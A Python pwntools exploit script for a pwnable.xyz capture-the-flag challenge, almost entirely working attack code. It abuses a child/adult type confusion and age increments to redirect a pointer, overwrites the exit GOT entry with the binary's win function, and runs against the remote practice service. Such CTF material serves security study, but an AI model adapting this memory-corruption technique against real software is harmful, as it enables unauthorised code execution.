from pwn import *

# Pwnable.xyz Message challenge
# 100 points

"""
Playing God today.
Menu:
 1. Move in adult
 2. Move in child
 3. Have Birthday
 4. Rejuvenate Person
 5. Transform Person
 6. Evict
> 6
"""

context(kernel="amd64", arch="amd64", log_level="info")

# int_offset = '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'

# Plan: Create child
#		Add his age until age != exit.ot
#		Transform child to adult
#		Transform (change job of adult)


# Plan 2:
#		Create child and parent
#		Transform child
#		Add some ages (it will increase pointer to job, so would point to parent's name)
#		Trasform child back to child
#		Change child's job to exit@got  (it will overwrite pointer to parents name) 
#		Change parents name to win_addr
#		Call exit function

def create_child(p, name, job, age=18):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"Age: ", str(age).encode("utf-8"))
	p.sendafter(b"Name: ", name)
	p.sendafter(b"Job: ", job)

def create_adult(p, name, job, age=20):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"Age: ", str(age).encode("utf-8"))
	p.sendafter(b"Name: ", name)
	p.sendafter(b"Job: ", job)


def age_up(p, person):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b"Person: ", str(person).encode("utf-8"))


def transform(p, person, name, job, init=True):
	if init:
		p.sendlineafter(b"> ", b"5")
	p.sendlineafter(b"Person: ", str(person).encode("utf-8"))
	p.sendafter(b"Name: ", name)
	p.sendafter(b"Job: ", job)


def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path)
		# gdb.attach(p)
		# sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30038)

	win_addr = e.symbols["win"]
	exit_got = e.got["exit"]


	create_child(p, b"N", b"J2", 18)
	create_adult(p, b"N2", b"J2", 29)

	transform(p, 0, b"Name2", b"Job2")

	for _ in range(0x30):
		age_up(p, 0)


	transform(p, 0, b"Name3", b"5")# p64(exit_got))
	transform(p, 0, b"Name4", p64(exit_got), init=False)

	transform(p, 1, p64(win_addr), b"Test_job")

	p.sendlineafter(b"> ", b"4")
	print(p.sendlineafter(b"Person: ", b"20"))
	p.sendlineafter(b"> ", b"0")

	# p.interactive()



main()

# name_len = 0x10
# job_len = 0x20


# # create_child
# payload = "2"+int_offset +  "18"+(int_offset[:-1]) + "A"*name_len + "B"*job_len 

# # age_up
# for _ in range(0x602070-18):
# 	payload += "3"+int_offset + "0"+int_offset


# # transform
# payload += "5"+int_offset + "0"+int_offset + "A"*name_len + "B"*job_len
# payload += "5"+int_offset + "0"+int_offset + "A"*name_len + '\xb3\t@\x00\x00\x00\x00\x00'.ljust(job_len, "B")


# payload += "4"+int_offset


# # print(payload)

# with open("payload.txt") as wf:
# 	wf.write(payload)